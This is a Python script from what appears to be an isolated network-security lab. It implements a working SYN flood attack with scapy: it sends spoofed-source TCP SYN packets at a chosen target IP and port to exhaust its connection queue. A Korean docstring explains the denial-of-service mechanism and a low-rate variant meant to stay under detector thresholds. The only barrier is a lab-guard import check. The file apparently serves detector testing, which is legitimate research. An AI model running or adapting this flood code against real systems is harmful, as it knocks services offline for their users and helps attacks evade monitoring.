"""SYN flood (w11) — 격리 실험용.

공격자가 가짜 출발지 IP로 TCP SYN을 대량으로 피해자의 한 포트에 보냅니다.
피해자는 SYN-ACK을 보내지만 ACK이 돌아오지 않는 연결(half-open)이 쌓여
연결 큐가 가득 차면 정상 접속을 못 받게 됩니다(서비스 거부).

이 스크립트는 SYN만 보냅니다. 핸드셰이크를 끝내거나 데이터를 전송하지
않습니다. 회피 변형(저속 SYN flood)은 별도 옵션이 아니라 --rate를 낮춰서(초당
패킷 수 감소) 규칙 탐지기의 임계치를 피하는 공격을 흉내냅니다
(scenarios.py의 syn_flood_slow 참고).

run.py가 Mininet 공격자 호스트 안에서 실행합니다. 직접 실행은 labguard가 막습니다.

    python env/attacks/syn_flood.py --iface h4-eth0 --target-ip 10.0.0.1 \
        --target-port 80 --rate 200 --duration 20
"""

from __future__ import annotations

import random
import time

from env.attacks.labguard import require_lab


def random_ip() -> str:
    # 10.0.0.0/24 바깥의 임의 출발지 IP처럼 보이게 함 (가짜 출발지)
    return f"10.{random.randint(1, 254)}.{random.randint(0, 254)}.{random.randint(1, 254)}"


def run(iface: str, target_ip: str, target_port: int, rate: float,
        duration: float) -> None:
    from scapy.all import IP, TCP, send

    interval = 1.0 / rate if rate > 0 else 0.0
    end = time.time() + duration
    sent = 0
    while time.time() < end:
        pkt = (IP(src=random_ip(), dst=target_ip)
               / TCP(sport=random.randint(1024, 65535), dport=target_port,
                     flags="S", seq=random.randint(0, 0xFFFFFFFF)))
        send(pkt, iface=iface, verbose=False)
        sent += 1
        if interval:
            time.sleep(interval)
    print(f"syn_flood 끝: {sent}개 SYN 전송 (target={target_ip}:{target_port})")


def main() -> None:
    require_lab()
    import argparse
    p = argparse.ArgumentParser(description="SYN flood (격리 실험용)")
    p.add_argument("--iface", required=True)
    p.add_argument("--target-ip", required=True)
    p.add_argument("--target-port", type=int, default=80)
    p.add_argument("--rate", type=float, default=200.0, help="초당 SYN 수")
    p.add_argument("--duration", type=float, default=20.0)
    a = p.parse_args()
    run(a.iface, a.target_ip, a.target_port, a.rate, a.duration)


if __name__ == "__main__":
    main()
